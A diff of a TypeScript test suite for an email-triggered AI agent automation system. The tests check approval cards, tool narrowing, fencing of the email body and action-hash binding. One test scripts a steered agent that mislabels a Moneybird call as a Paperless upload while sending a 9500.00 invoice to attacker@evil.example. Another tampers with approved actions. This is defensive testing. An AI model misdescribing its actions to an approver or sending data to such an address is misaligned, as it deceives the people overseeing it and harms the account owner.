@@ -11,12 +11,12 @@ import {
   type AutomationRecipeInput,
   agentDefaultGrants,
   newId,
-  recipeDefinition,
 } from '@whombat/core';
 import { and, asc, eq, gt } from 'drizzle-orm';
 import { beforeAll, describe, expect, it, vi } from 'vitest';
 import type { AgentAuth } from '../auth/agent-tokens';
 import { decideApproval } from '../commands/approvals';
+import { reactToMessage, sendMessage } from '../commands/messages';
 import { syncTools } from '../connections/sync';
 import { GoogleApiError } from '../connectors/types';
 import type { FakeGoogleWorkspace } from '../connectors/workspace-fake';
@@ -24,6 +24,7 @@ import {
   approvals,
   attachments,
   automationPlans,
+  automationRunSteps,
   automationRuns,
   automationVersions,
   catalogConnections,
@@ -45,10 +46,15 @@ import { IDS, useAutomationWorld } from '../test/automations';
 import { insertConnection, setConnectionKeys } from '../test/connections';
 import { addPersonalAgent, FAKE_ACCESS_TOKEN, type PersonalSetup } from '../test/personal';
 import { useVaultNetForTests } from '../vault/net';
-import { createAutomation, deleteAutomation, setAutomationEnabled } from './commands';
+import {
+  createAutomation,
+  deleteAutomation,
+  publishAutomationDraft,
+  saveAutomationDraft,
+  setAutomationEnabled,
+} from './commands';
 import { acceptAutomationPlan, proposeAutomationPlan } from './plans';
 import { loadAutomationRow, toAutomation } from './store';
-import { updateAutomationsWords } from './words';
 
 const w = useAutomationWorld();
 let maraChat: PersonalSetup;
@@ -869,8 +875,9 @@ describe('mail-arrives automations', () => {
     // Baseline.
     await pollAndSettle();
 
-    // Deliver a matching email and poll without settling the automation engine yet.
+    // Deliver a matching email (with an attachment) and poll without settling the automation engine yet.
     w.advance(10_000);
+    const f6Pdf = Buffer.from('%PDF-1.4\nPrivacy PDF\n%%EOF');
     fake.deliverMail(FAKE_ACCESS_TOKEN, {
       id: 'msg_f6_one',
       from: 'Billing <billing@example.com>',
@@ -880,7 +887,15 @@ describe('mail-arrives automations', () => {
       messageId: '<f6-one@example.com>',
       date: w.now(),
       labelIds: ['INBOX'],
-      attachments: [],
+      attachments: [
+        {
+          id: 'att_f6_pdf',
+          name: 'privacy-invoice.pdf',
+          mimeType: 'application/pdf',
+          size: f6Pdf.length,
+          contentBase64: f6Pdf.toString('base64'),
+        },
+      ],
     });
     expect(await w.services.mailTriggers.pollOnce()).toBe(1);
     const [beforeRun] = await w.services.db
@@ -892,13 +907,27 @@ describe('mail-arrives automations', () => {
     expect(beforeRun?.body).toContain('CONFIDENTIAL_BODY_F6_SHOULD_BE_CLEARED');
     expect(beforeRun?.snippet.length).toBeGreaterThan(0);
 
-    // Once the run starts, the run scope has the fenced email while mail_trigger_items drops body and snippet.
+    // Once the agent step renders its prompt, the rendered prompt has the fenced body, while BOTH mail_trigger_items
+    // AND automation_runs.scope strip body/snippet/text — keeping sender, subject and attachment names on the run.
     await w.settle();
     const runs = await runsOf(autoId);
     expect(runs).toHaveLength(1);
-    expect(String((runs[0]?.scope as { body?: string })?.body ?? '')).toContain(
-      'CONFIDENTIAL_BODY_F6_SHOULD_BE_CLEARED',
-    );
+    const runScope = (runs[0]?.scope ?? {}) as Record<string, unknown>;
+    expect(runScope).not.toHaveProperty('body');
+    expect(runScope).not.toHaveProperty('snippet');
+    expect(runScope).not.toHaveProperty('text');
+    expect(JSON.stringify(runScope)).not.toContain('CONFIDENTIAL_BODY_F6_SHOULD_BE_CLEARED');
+    expect(String(runScope.from ?? '')).toContain('billing@example.com');
+    expect(String(runScope.subject ?? '')).toContain('Privacy invoice #1');
+    expect(String(runScope.attachments ?? '')).toContain('privacy-invoice.pdf');
+
+    const runDetail = await w.run(runs[0]?.id as string);
+    const [f6Dispatch] = await w.services.db
+      .select()
+      .from(dispatches)
+      .where(eq(dispatches.id, runDetail.steps[0]?.dispatchId as string));
+    const f6Ctx = await buildDispatchContext(w.services, f6Dispatch as NonNullable<typeof f6Dispatch>);
+    expect(f6Ctx.trigger?.text).toContain('CONFIDENTIAL_BODY_F6_SHOULD_BE_CLEARED');
     const [afterRun] = await w.services.db
       .select()
       .from(mailTriggerItems)
@@ -1034,7 +1063,7 @@ describe('mail-arrives automations', () => {
     await w.ok(IDS.mara, deleteAutomation, { automationId: ghAutoId });
   });
 
-  it('runs the invoice workflow end to end with fake Paperless-ngx and Moneybird only after approval regardless of standing settings, and upgrades earlier mail automations', async () => {
+  it('runs the invoice workflow end to end with fake Paperless-ngx and Moneybird only after approval regardless of standing settings', async () => {
     const PL_TOKEN = 'a'.repeat(40);
     const MB_TOKEN = 'b'.repeat(64);
     const seenPaperless: { method: string; url: string; auth: string; contentType: string; body: Buffer }[] =
@@ -1092,7 +1121,8 @@ describe('mail-arrives automations', () => {
     const mbPort = (moneybirdServer.address() as AddressInfo).port;
 
     let autoId = '';
-    let legacyId = '';
+    let plId = '';
+    let mbId = '';
     const netId = newId('vaultNetwork');
     try {
       useVaultNetForTests(w.services, {
@@ -1118,7 +1148,7 @@ describe('mail-arrives automations', () => {
       // Standing settings at maximum auto-allow: connections.read/write = 'can' and both tools = 'can'.
       await setConnectionKeys(w.services, IDS.dusty, { read: 'can', write: 'can' });
 
-      const plId = await insertConnection(w.services, {
+      plId = await insertConnection(w.services, {
         catalogId: 'paperless',
         burrowId: w.burrowId,
         connectedById: IDS.mara,
@@ -1129,7 +1159,7 @@ describe('mail-arrives automations', () => {
       });
       await syncTools(w.services, plId);
 
-      const mbId = await insertConnection(w.services, {
+      mbId = await insertConnection(w.services, {
         catalogId: 'moneybird',
         burrowId: w.burrowId,
         connectedById: IDS.mara,
@@ -1153,27 +1183,6 @@ describe('mail-arrives automations', () => {
         .update(connectionTools)
         .set({ tier: 'can' })
         .where(eq(connectionTools.connectionId, mbId));
-
-      // Earlier 1-step mail automations upgrade automatically on startup to today's 2-step outsiders form.
-      const invoiceRecipe: AutomationRecipeInput = {
-        when: { kind: 'mail', connectionId, from: 'example.com', attachmentTypes: ['pdf'] },
-        job: 'custom',
-        instructions: 'Put the PDF in Paperless-ngx and make a draft in Moneybird.',
-        conversationId: maraChat.dmId,
-      };
-      legacyId = await w.publish(recipeDefinition(invoiceRecipe, 'mail-before-outsiders'), {
-        name: 'Legacy invoice rule',
-        enable: false,
-      });
-      expect(await updateAutomationsWords(w.services)).toBeGreaterThanOrEqual(1);
-      const [upgradedRow] = await w.services.db
-        .select()
-        .from(automationVersions)
-        .where(and(eq(automationVersions.automationId, legacyId), eq(automationVersions.n, 2)));
-      expect(upgradedRow?.definition.steps.map((s) => s.kind)).toEqual([
-        'dispatch_agent',
-        'connection_actions',
-      ]);
 
       // Publish the live invoice automation and baseline.
       autoId = await createMailAutomation(
@@ -1291,8 +1300,13 @@ describe('mail-arrives automations', () => {
       expect(approvalId).toBeTruthy();
       const [cardRow] = await w.services.db.select().from(approvals).where(eq(approvals.id, approvalId));
       expect(cardRow?.state).toBe('pending');
-      expect(cardRow?.summary).toContain('Paperless-ngx');
-      expect(cardRow?.summary).toContain('Moneybird');
+      expect(cardRow?.title).toContain('Paperless-ngx');
+      expect(cardRow?.title).toContain('Moneybird');
+      expect(cardRow?.summary).toContain('POST /api/documents/post_document/');
+      expect(cardRow?.summary).toContain('uploading “invoice-2042.pdf”');
+      expect(cardRow?.summary).toContain('POST /12345/documents/purchase_invoices.json');
+      expect(cardRow?.summary).toContain('price: 420.00');
+      expect(cardRow?.summary).toContain('Agent note:');
       // Still ZERO outbound calls while the card waits!
       expect(seenPaperless).toHaveLength(0);
       expect(seenMoneybird).toHaveLength(0);
@@ -1480,7 +1494,1086 @@ describe('mail-arrives automations', () => {
       await new Promise<void>((r) => moneybirdServer.close(() => r()));
       await w.services.db.delete(vaultNetworks).where(eq(vaultNetworks.id, netId));
       if (autoId) await w.ok(IDS.mara, deleteAutomation, { automationId: autoId });
-      if (legacyId) await w.ok(IDS.mara, deleteAutomation, { automationId: legacyId });
+      for (const cid of [plId, mbId].filter(Boolean)) {
+        await w.services.db.delete(catalogConnections).where(eq(catalogConnections.id, cid));
+      }
+      await pollAndSettle();
+    }
+  });
+
+  it('narrows proposable connections and calls, omitting labels, built-ins, T3 Code, DELETE and read-only calls', async () => {
+    const privateLabel = 'Secret Family Archive Label';
+    const plId = await insertConnection(w.services, {
+      catalogId: 'paperless',
+      burrowId: w.burrowId,
+      connectedById: IDS.mara,
+      fields: { url: 'http://paperless-narrow.example.com:8000' },
+      auth: { type: 'header', name: 'Authorization', template: 'Token {secret}' },
+      secret: 'c'.repeat(40),
+      label: privateLabel,
+    });
+    await syncTools(w.services, plId);
+
+    const dropboxId = await insertConnection(w.services, {
+      catalogId: 'dropbox',
+      burrowId: w.burrowId,
+      connectedById: IDS.mara,
+      fields: {},
+      auth: { type: 'bearer' },
+      secret: 'd'.repeat(40),
+      label: 'Personal Dropbox Secret Label',
+    });
+    await syncTools(w.services, dropboxId);
+
+    const serversId = newId('connection');
+    await w.services.db.insert(catalogConnections).values({
+      id: serversId,
+      catalogId: 'whombat_servers',
+      burrowId: w.burrowId,
+      connectedById: IDS.mara,
+      label: 'Home Servers',
+      handle: 'servers',
+      transport: 'builtin',
+      signIn: 'none',
+      baseUrl: '',
+      fields: {},
+      auth: null,
+      status: 'active',
+      createdAt: w.now(),
+      updatedAt: w.now(),
+    });
+    await syncTools(w.services, serversId);
+
+    const t3Id = await insertConnection(w.services, {
+      catalogId: 't3code',
+      burrowId: w.burrowId,
+      connectedById: IDS.mara,
+      fields: { url: 'http://10.100.92.20:3773' },
+      auth: { type: 'bearer' },
+      secret: 't'.repeat(40),
+      label: 'Dev Laptop T3',
+    });
+    await w.services.db.insert(connectionTools).values({
+      connectionId: t3Id,
+      name: 't3_thread_launch',
+      description: 'Start a coding thread',
+      inputSchema: { type: 'object', properties: {} },
+      access: 'write',
+      origin: 'mcp',
+      tier: 'can',
+      hash: 'e'.repeat(64),
+    });
+
+    const autoId = await createMailAutomation({
+      kind: 'mail',
+      connectionId,
+      from: 'example.com',
+      subjectContains: ['narrow-surface'],
+    });
+    try {
+      await pollAndSettle();
+      w.advance(10_000);
+      fake.deliverMail(FAKE_ACCESS_TOKEN, {
+        id: 'msg_narrow_surface',
+        from: 'Billing <billing@example.com>',
+        to: ['you@example.com'],
+        subject: 'narrow-surface test',
+        body: 'Test narrow surface.',
+        messageId: '<narrow-surface@example.com>',
+        date: w.now(),
+        labelIds: ['INBOX', 'UNREAD'],
+        attachments: [],
+      });
+      expect(await pollAndSettle()).toBe(1);
+      const [runRow] = await runsOf(autoId);
+      const run = await w.run(runRow?.id as string);
+      const dispatchId = run.steps[0]?.dispatchId as string;
+      const [dispatch] = await w.services.db.select().from(dispatches).where(eq(dispatches.id, dispatchId));
+      const ctx = await buildDispatchContext(w.services, dispatch as NonNullable<typeof dispatch>);
+      const prompt = ctx.trigger?.text ?? '';
+
+      // Prompt names handles and writable tools, never the person's own labels, read-only tools, delete tools,
+      // whombat_servers, or t3code.
+      expect(prompt).toContain('- paperless: tools [request]');
+      expect(prompt).not.toContain(privateLabel);
+      expect(prompt).not.toContain('Personal Dropbox Secret Label');
+      expect(prompt).not.toContain('files_list');
+      expect(prompt).not.toContain('files_delete');
+      expect(prompt).not.toContain('Home Servers');
+      expect(prompt).not.toContain('servers: tools');
+      expect(prompt).not.toContain('t3_thread_launch');
+      expect(prompt).not.toContain('Dev Laptop T3');
+
+      await w.services.db
+        .update(dispatches)
+        .set({ state: 'running', claimedAt: w.now() })
+        .where(eq(dispatches.id, dispatchId));
+      const auth: AgentAuth = { dispatchId, agentId: IDS.dusty, burrowId: w.burrowId };
+
+      const [serversConn] = await w.services.db
+        .select()
+        .from(catalogConnections)
+        .where(eq(catalogConnections.id, serversId));
+      const [t3Conn] = await w.services.db
+        .select()
+        .from(catalogConnections)
+        .where(eq(catalogConnections.id, t3Id));
+      const [plConn] = await w.services.db
+        .select()
+        .from(catalogConnections)
+        .where(eq(catalogConnections.id, plId));
+      const [dbxConn] = await w.services.db
+        .select()
+        .from(catalogConnections)
+        .where(eq(catalogConnections.id, dropboxId));
+
+      const refusedCases: { name: string; action: Record<string, unknown>; expectedText: string }[] = [
+        {
+          name: 'whombat_servers',
+          action: {
+            connection: serversConn?.handle ?? 'servers',
+            tool: 'guest_power',
+            summary: 'Restart guest',
+            arguments: { server: 'pve-01', guest: 'pve:101', action: 'start' },
+          },
+          expectedText: 'can’t be proposed',
+        },
+        {
+          name: 't3code',
+          action: {
+            connection: t3Conn?.handle ?? 't3',
+            tool: 't3_thread_launch',
+            summary: 'Launch thread',
+            arguments: { projectId: 'p1', title: 'run', message: 'hi' },
+          },
+          expectedText: 'can’t be proposed',
+        },
+        {
+          name: 'HTTP DELETE',
+          action: {
+            connection: plConn?.handle ?? 'paperless',
+            tool: 'request',
+            summary: 'Upload invoice.pdf',
+            arguments: { method: 'DELETE', path: '/api/documents/1/' },
+          },
+          expectedText: 'DELETE',
+        },
+        {
+          name: 'HTTP GET',
+          action: {
+            connection: plConn?.handle ?? 'paperless',
+            tool: 'request',
+            summary: 'List docs',
+            arguments: { method: 'GET', path: '/api/documents/' },
+          },
+          expectedText: 'read-only GET',
+        },
+        {
+          name: 'HTTP HEAD',
+          action: {
+            connection: plConn?.handle ?? 'paperless',
+            tool: 'request',
+            summary: 'Check docs',
+            arguments: { method: 'HEAD', path: '/api/documents/' },
+          },
+          expectedText: 'read-only HEAD',
+        },
+        {
+          name: 'read-only adapter tool',
+          action: {
+            connection: dbxConn?.handle ?? 'dropbox',
+            tool: 'files_list',
+            summary: 'List files',
+            arguments: { path: '/' },
+          },
+          expectedText: 'read-only',
+        },
+        {
+          name: 'delete adapter tool',
+          action: {
+            connection: dbxConn?.handle ?? 'dropbox',
+            tool: 'files_delete',
+            summary: 'Delete file',
+            arguments: { path: '/old.pdf' },
+          },
+          expectedText: 'files_delete',
+        },
+      ];
+
+      for (const tc of refusedCases) {
+        const res = await callTool(w.services, auth, 'propose_connection_actions', {
+          actions: [tc.action],
+        });
+        expect(res.isError, tc.name).toBe(true);
+        const text = JSON.stringify(res.content);
+        expect(text, tc.name).toContain(tc.expectedText);
+        expect(text, tc.name).not.toContain(privateLabel);
+      }
+    } finally {
+      await w.ok(IDS.mara, deleteAutomation, { automationId: autoId });
+      for (const cid of [plId, dropboxId, serversId, t3Id]) {
+        await w.services.db.delete(catalogConnections).where(eq(catalogConnections.id, cid));
+      }
+      await pollAndSettle();
+    }
+  });
+
+  it('describes the real call on the approval card when the agent summary disagrees', async () => {
+    const mbId = await insertConnection(w.services, {
+      catalogId: 'moneybird',
+      burrowId: w.burrowId,
+      connectedById: IDS.mara,
+      fields: { administration: '12345' },
+      auth: { type: 'bearer' },
+      secret: 'm'.repeat(64),
+      label: 'Moneybird Accounting',
+    });
+    await syncTools(w.services, mbId);
+    await setConnectionKeys(w.services, IDS.dusty, { read: 'can', write: 'can' });
+
+    const autoId = await createMailAutomation({
+      kind: 'mail',
+      connectionId,
+      from: 'example.com',
+      subjectContains: ['misleading-card'],
+    });
+    try {
+      await pollAndSettle();
+      w.advance(10_000);
+      fake.deliverMail(FAKE_ACCESS_TOKEN, {
+        id: 'msg_misleading_card',
+        from: 'Billing <billing@example.com>',
+        to: ['you@example.com'],
+        subject: 'misleading-card invoice',
+        body: 'Steered invoice.',
+        messageId: '<misleading-card@example.com>',
+        date: w.now(),
+        labelIds: ['INBOX', 'UNREAD'],
+        attachments: [],
+      });
+      expect(await pollAndSettle()).toBe(1);
+      const [runRow] = await runsOf(autoId);
+      const run = await w.run(runRow?.id as string);
+      const dispatchId = run.steps[0]?.dispatchId as string;
+      await w.services.db
+        .update(dispatches)
+        .set({ state: 'running', claimedAt: w.now() })
+        .where(eq(dispatches.id, dispatchId));
+
+      // The steered agent lies in `summary` ("Upload invoice.pdf to Paperless-ngx?"), while actually calling
+      // Moneybird to email an invoice to an attacker with an amount.
+      const res = await callTool(
+        w.services,
+        { dispatchId, agentId: IDS.dusty, burrowId: w.burrowId },
+        'propose_connection_actions',
+        {
+          actions: [
+            {
+              connection: 'moneybird',
+              tool: 'request',
+              summary: 'Upload invoice.pdf to Paperless-ngx?',
+              arguments: {
+                method: 'POST',
+                path: '/12345/sales_invoices/99/send_invoice.json',
+                body: {
+                  sales_invoice_sending: {
+                    email_address: 'attacker@evil.example',
+                    amount: '9500.00',
+                  },
+                },
+              },
+            },
+          ],
+        },
+      );
+      expect(res.isError).not.toBe(true);
+      await w.fakeAgentReply(dispatchId, 'Proposed action.');
+      await w.settle();
+
+      const waiting = await w.run(runRow?.id as string);
+      const approvalId = waiting.steps[1]?.approvalId as string;
+      const [card] = await w.services.db.select().from(approvals).where(eq(approvals.id, approvalId));
+      const cardMsg = card?.messageId ? await loadMessageRow(w.services.db, card.messageId) : undefined;
+
+      // Title, question, WHAT HAPPENS and message text all lead with the real server-described call.
+      expect(card?.title).toContain('Moneybird Accounting');
+      expect(card?.title).toContain('POST /12345/sales_invoices/99/send_invoice.json');
+      expect(card?.title).toContain('attacker@evil.example');
+      expect(card?.title).not.toContain('Paperless-ngx');
+
+      expect(card?.question).toContain('Moneybird Accounting');
+      expect(card?.question).toContain('POST /12345/sales_invoices/99/send_invoice.json');
+      expect(card?.question).not.toContain('Paperless-ngx');
+
+      expect(card?.whatHappens[0]).toContain(
+        'Moneybird Accounting: POST /12345/sales_invoices/99/send_invoice.json',
+      );
+      expect(card?.whatHappens[0]).toContain('amount: 9500.00');
+      expect(card?.whatHappens[0]).toContain('Agent note: Upload invoice.pdf to Paperless-ngx?');
+
+      expect(cardMsg?.text).toContain(
+        '• Moneybird Accounting: POST /12345/sales_invoices/99/send_invoice.json',
+      );
+      expect(cardMsg?.text).toContain('Agent note: Upload invoice.pdf to Paperless-ngx?');
+    } finally {
+      await w.ok(IDS.mara, deleteAutomation, { automationId: autoId });
+      await w.services.db.delete(catalogConnections).where(eq(catalogConnections.id, mbId));
+      await pollAndSettle();
+    }
+  });
+
+  it('asks again instead of running when proposed actions change after approval', async () => {
+    const seen: { url: string; body: string }[] = [];
+    const server = createServer((req: IncomingMessage, res: ServerResponse) => {
+      const chunks: Buffer[] = [];
+      req.on('data', (c: Buffer) => chunks.push(c));
+      req.on('end', () => {
+        seen.push({ url: req.url ?? '', body: Buffer.concat(chunks).toString('utf8') });
+        res.writeHead(201, { 'content-type': 'application/json' });
+        res.end(JSON.stringify({ id: '1' }));
+      });
+    });
+    await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
+    const port = (server.address() as AddressInfo).port;
+    const netId = newId('vaultNetwork');
+    let mbId = '';
+    let autoId = '';
+    try {
+      useVaultNetForTests(w.services, {
+        resolve: async (host) => {
+          if (host === 'moneybird-bind.example.com') return [{ address: '10.100.92.21', family: 4 }];
+          throw Object.assign(new Error(`ENOTFOUND ${host}`), { code: 'ENOTFOUND' });
+        },
+        dialAddress: (address) => (address === '10.100.92.21' ? '127.0.0.1' : address),
+        deadlineMs: 3000,
+      });
+      await w.services.db.insert(vaultNetworks).values({
+        id: netId,
+        cidr: '10.100.92.0/24',
+        ports: [port],
+        note: 'Moneybird bind test',
+        addedByAccountId: null,
+        addedAt: w.now(),
+      });
+      mbId = await insertConnection(w.services, {
+        catalogId: 'moneybird',
+        burrowId: w.burrowId,
+        connectedById: IDS.mara,
+        fields: { administration: '12345' },
+        auth: { type: 'bearer' },
+        secret: 'm'.repeat(64),
+        label: 'Moneybird',
+      });
+      await w.services.db
+        .update(catalogConnections)
+        .set({ baseUrl: `http://moneybird-bind.example.com:${port}/api/v2` })
+        .where(eq(catalogConnections.id, mbId));
+      await syncTools(w.services, mbId);
+      await setConnectionKeys(w.services, IDS.dusty, { read: 'can', write: 'can' });
+
+      autoId = await createMailAutomation({
+        kind: 'mail',
+        connectionId,
+        from: 'example.com',
+        subjectContains: ['hash-binding'],
+      });
+      await pollAndSettle();
+      w.advance(10_000);
+      fake.deliverMail(FAKE_ACCESS_TOKEN, {
+        id: 'msg_hash_binding',
+        from: 'Billing <billing@example.com>',
+        to: ['you@example.com'],
+        subject: 'hash-binding invoice',
+        body: 'Test hash binding.',
+        messageId: '<hash-binding@example.com>',
+        date: w.now(),
+        labelIds: ['INBOX', 'UNREAD'],
+        attachments: [],
+      });
+      expect(await pollAndSettle()).toBe(1);
+      const [runRow] = await runsOf(autoId);
+      const runId = runRow?.id as string;
+      const run0 = await w.run(runId);
+      const dispatchId = run0.steps[0]?.dispatchId as string;
+      await w.services.db
+        .update(dispatches)
+        .set({ state: 'running', claimedAt: w.now() })
+        .where(eq(dispatches.id, dispatchId));
+      await callTool(
+        w.services,
+        { dispatchId, agentId: IDS.dusty, burrowId: w.burrowId },
+        'propose_connection_actions',
+        {
+          actions: [
+            {
+              connection: 'moneybird',
+              tool: 'request',
+              summary: 'Draft INV-A',
+              arguments: {
+                method: 'POST',
+                path: '/12345/documents/purchase_invoices.json',
+                body: { purchase_invoice: { reference: 'INV-A', amount: '10.00' } },
+              },
+            },
+          ],
+        },
+      );
+      await w.fakeAgentReply(dispatchId, 'Proposed INV-A.');
+      await w.settle();
+
+      const waiting1 = await w.run(runId);
+      const firstApprovalId = waiting1.steps[1]?.approvalId as string;
+      const [card1] = await w.services.db.select().from(approvals).where(eq(approvals.id, firstApprovalId));
+      expect(card1?.state).toBe('pending');
+      expect(card1?.title).toContain('INV-A');
+
+      // Approve card #1 (continueStep puts step 2 back to `pending` with actionsApprovalId = card1.id).
+      await w.ok(IDS.mara, decideApproval, { number: card1?.number as number, decision: 'approve' });
+
+      // Before the engine executes step 2, tamper with step 0's proposedActions to swap in INV-B (amount 9999.00).
+      const [step0] = await w.services.db
+        .select()
+        .from(automationRunSteps)
+        .where(and(eq(automationRunSteps.runId, runId), eq(automationRunSteps.idx, 0)));
+      await w.services.db
+        .update(automationRunSteps)
+        .set({
+          output: {
+            ...(step0?.output as Record<string, unknown>),
+            proposedActions: [
+              {
+                connection: 'moneybird',
+                tool: 'request',
+                summary: 'Draft INV-B',
+                arguments: {
+                  method: 'POST',
+                  path: '/12345/documents/purchase_invoices.json',
+                  body: { purchase_invoice: { reference: 'INV-B', amount: '9999.00' } },
+                },
+              },
+            ],
+          },
+        })
+        .where(and(eq(automationRunSteps.runId, runId), eq(automationRunSteps.idx, 0)));
+
+      // Engine ticks: re-planned actionsHash differs from card #1, so ZERO calls run and a NEW card is posted!
+      await w.settle();
+      expect(seen).toHaveLength(0);
+      const waiting2 = await w.run(runId);
+      expect(waiting2.status).toBe('waiting');
+      expect(waiting2.steps[1]?.state).toBe('waiting');
+      const secondApprovalId = waiting2.steps[1]?.approvalId as string;
+      expect(secondApprovalId).toBeTruthy();
+      expect(secondApprovalId).not.toBe(firstApprovalId);
+
+      const [card2] = await w.services.db.select().from(approvals).where(eq(approvals.id, secondApprovalId));
+      expect(card2?.state).toBe('pending');
+      expect(card2?.title).toContain('9999.00');
+      expect(card2?.title).toContain('INV-B');
+
+      // Approving card #2 runs INV-B.
+      await w.ok(IDS.mara, decideApproval, { number: card2?.number as number, decision: 'approve' });
+      await w.settle();
+      const done = await w.run(runId);
+      expect(done.status).toBe('succeeded');
+      expect(seen).toHaveLength(1);
+      expect(seen[0]?.body).toContain('INV-B');
+    } finally {
+      await new Promise<void>((r) => server.close(() => r()));
+      await w.services.db.delete(vaultNetworks).where(eq(vaultNetworks.id, netId));
+      if (autoId) await w.ok(IDS.mara, deleteAutomation, { automationId: autoId });
+      if (mbId) await w.services.db.delete(catalogConnections).where(eq(catalogConnections.id, mbId));
+      await pollAndSettle();
+    }
+  });
+
+  it('settles connection_actions as uncertain on timeout or partial-batch failure, and failed on clean first-call error', async () => {
+    const openResponses: ServerResponse[] = [];
+    let mode: 'timeout' | 'partial' | 'first_fail' = 'timeout';
+    let hitCount = 0;
+    const server = createServer((req: IncomingMessage, res: ServerResponse) => {
+      req.resume();
+      req.on('end', () => {
+        hitCount++;
+        if (mode === 'timeout') {
+          openResponses.push(res);
+          return;
+        }
+        if (mode === 'partial' && hitCount === 1) {
+          res.writeHead(201, { 'content-type': 'application/json' });
+          res.end(JSON.stringify({ id: 'first-ok' }));
+          return;
+        }
+        res.writeHead(422, { 'content-type': 'application/json' });
+        res.end(JSON.stringify({ error: 'Unprocessable' }));
+      });
+    });
+    await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
+    const port = (server.address() as AddressInfo).port;
+    const netId = newId('vaultNetwork');
+    let mbId = '';
+    let autoId = '';
+
+    const runWithActions = async (msgId: string, actions: Record<string, unknown>[]) => {
+      w.advance(10_000);
+      fake.deliverMail(FAKE_ACCESS_TOKEN, {
+        id: msgId,
+        from: 'Billing <billing@example.com>',
+        to: ['you@example.com'],
+        subject: `honest-outcome ${msgId}`,
+        body: 'Test outcome.',
+        messageId: `<${msgId}@example.com>`,
+        date: w.now(),
+        labelIds: ['INBOX', 'UNREAD'],
+        attachments: [],
+      });
+      expect(await pollAndSettle()).toBe(1);
+      const runs = await runsOf(autoId);
+      const latest = runs.at(-1);
+      const runId = latest?.id as string;
+      const run0 = await w.run(runId);
+      const dispatchId = run0.steps[0]?.dispatchId as string;
+      await w.services.db
+        .update(dispatches)
+        .set({ state: 'running', claimedAt: w.now() })
+        .where(eq(dispatches.id, dispatchId));
+      const proposed = await callTool(
+        w.services,
+        { dispatchId, agentId: IDS.dusty, burrowId: w.burrowId },
+        'propose_connection_actions',
+        { actions },
+      );
+      expect(proposed.isError).not.toBe(true);
+      await w.fakeAgentReply(dispatchId, 'Proposed actions.');
+      await w.settle();
+      const waiting = await w.run(runId);
+      const [card] = await w.services.db
+        .select()
+        .from(approvals)
+        .where(eq(approvals.id, waiting.steps[1]?.approvalId as string));
+      await w.ok(IDS.mara, decideApproval, { number: card?.number as number, decision: 'approve' });
+      await w.settle();
+      return w.run(runId);
+    };
+
+    try {
+      useVaultNetForTests(w.services, {
+        resolve: async (host) => {
+          if (host === 'moneybird-outcome.example.com') return [{ address: '10.100.92.22', family: 4 }];
+          throw Object.assign(new Error(`ENOTFOUND ${host}`), { code: 'ENOTFOUND' });
+        },
+        dialAddress: (address) => (address === '10.100.92.22' ? '127.0.0.1' : address),
+        deadlineMs: 250,
+      });
+      await w.services.db.insert(vaultNetworks).values({
+        id: netId,
+        cidr: '10.100.92.0/24',
+        ports: [port],
+        note: 'Moneybird outcome test',
+        addedByAccountId: null,
+        addedAt: w.now(),
+      });
+      mbId = await insertConnection(w.services, {
+        catalogId: 'moneybird',
+        burrowId: w.burrowId,
+        connectedById: IDS.mara,
+        fields: { administration: '12345' },
+        auth: { type: 'bearer' },
+        secret: 'm'.repeat(64),
+        label: 'Moneybird',
+      });
+      await w.services.db
+        .update(catalogConnections)
+        .set({ baseUrl: `http://moneybird-outcome.example.com:${port}/api/v2` })
+        .where(eq(catalogConnections.id, mbId));
+      await syncTools(w.services, mbId);
+      await setConnectionKeys(w.services, IDS.dusty, { read: 'can', write: 'can' });
+
+      autoId = await createMailAutomation({
+        kind: 'mail',
+        connectionId,
+        from: 'example.com',
+        subjectContains: ['honest-outcome'],
+      });
+      await pollAndSettle();
+
+      // 1. Clean error on the very first call (HTTP 422, no timeout) settles as failed (and frees its run slot).
+      mode = 'first_fail';
+      hitCount = 0;
+      const cleanFailRun = await runWithActions('msg_outcome_fail', [
+        {
+          connection: 'moneybird',
+          tool: 'request',
+          summary: 'Draft failing',
+          arguments: {
+            method: 'POST',
+            path: '/12345/documents/purchase_invoices.json',
+            body: { purchase_invoice: { reference: 'INV-FAIL' } },
+          },
+        },
+      ]);
+      expect(cleanFailRun.steps[1]?.state).toBe('failed');
+      expect(cleanFailRun.status).toBe('failed');
+
+      // 2. Timeout on a call settles as uncertain (needs_review), not failed.
+      mode = 'timeout';
+      hitCount = 0;
+      const timedOutRun = await runWithActions('msg_outcome_timeout', [
+        {
+          connection: 'moneybird',
+          tool: 'request',
+          summary: 'Draft timeout invoice',
+          arguments: {
+            method: 'POST',
+            path: '/12345/documents/purchase_invoices.json',
+            body: { purchase_invoice: { reference: 'INV-TIMEOUT' } },
+          },
+        },
+      ]);
+      expect(timedOutRun.steps[1]?.state).toBe('uncertain');
+      expect(timedOutRun.status).toBe('needs_review');
+      expect(timedOutRun.steps[1]?.error).toContain('didn’t answer in time');
+
+      // 3. Partial batch (call 1 succeeds, call 2 returns HTTP 422) settles as uncertain (needs_review).
+      mode = 'partial';
+      hitCount = 0;
+      const partialRun = await runWithActions('msg_outcome_partial', [
+        {
+          connection: 'moneybird',
+          tool: 'request',
+          summary: 'Draft first',
+          arguments: {
+            method: 'POST',
+            path: '/12345/documents/purchase_invoices.json',
+            body: { purchase_invoice: { reference: 'INV-P1' } },
+          },
+        },
+        {
+          connection: 'moneybird',
+          tool: 'request',
+          summary: 'Draft second',
+          arguments: {
+            method: 'POST',
+            path: '/12345/documents/purchase_invoices.json',
+            body: { purchase_invoice: { reference: 'INV-P2' } },
+          },
+        },
+      ]);
+      expect(partialRun.steps[1]?.state).toBe('uncertain');
+      expect(partialRun.status).toBe('needs_review');
+      expect(partialRun.steps[1]?.output).toMatchObject({ ran: true, count: 1 });
+    } finally {
+      for (const r of openResponses) {
+        if (!r.writableEnded) r.destroy();
+      }
+      await new Promise<void>((r) => server.close(() => r()));
+      await w.services.db.delete(vaultNetworks).where(eq(vaultNetworks.id, netId));
+      if (autoId) await w.ok(IDS.mara, deleteAutomation, { automationId: autoId });
+      if (mbId) await w.services.db.delete(catalogConnections).where(eq(catalogConnections.id, mbId));
+      await pollAndSettle();
+    }
+  });
+
+  it('stamps outsiders_run provenance on mail run messages so message_posted and reaction_added automations never fire on them', async () => {
+    const mbId = await insertConnection(w.services, {
+      catalogId: 'moneybird',
+      burrowId: w.burrowId,
+      connectedById: IDS.mara,
+      fields: { administration: '12345' },
+      auth: { type: 'bearer' },
+      secret: 'm'.repeat(64),
+      label: 'Moneybird',
+    });
